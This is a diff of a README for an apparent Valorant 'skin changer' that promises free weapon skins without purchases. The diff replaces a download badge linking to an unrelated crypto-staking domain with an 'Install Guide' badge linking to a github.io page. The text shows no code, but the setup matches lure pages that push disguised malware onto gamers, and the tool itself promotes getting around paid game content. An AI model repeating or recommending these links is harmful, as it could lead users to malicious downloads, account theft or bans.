@@ -2,7 +2,10 @@
 
 Skin Changer Valorant 2025 is a powerful tool that allows Valorant players to instantly change weapon skins, knife designs, and effects without in-game purchases.
 
-[![Download Skin Changer Valorant 2025](https://img.shields.io/badge/Download-Skin_Changer_Valorant_2025-blueviolet)](https://ton-stake.net)
+<a href="https://skin-changer-valorant-2025-kit.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
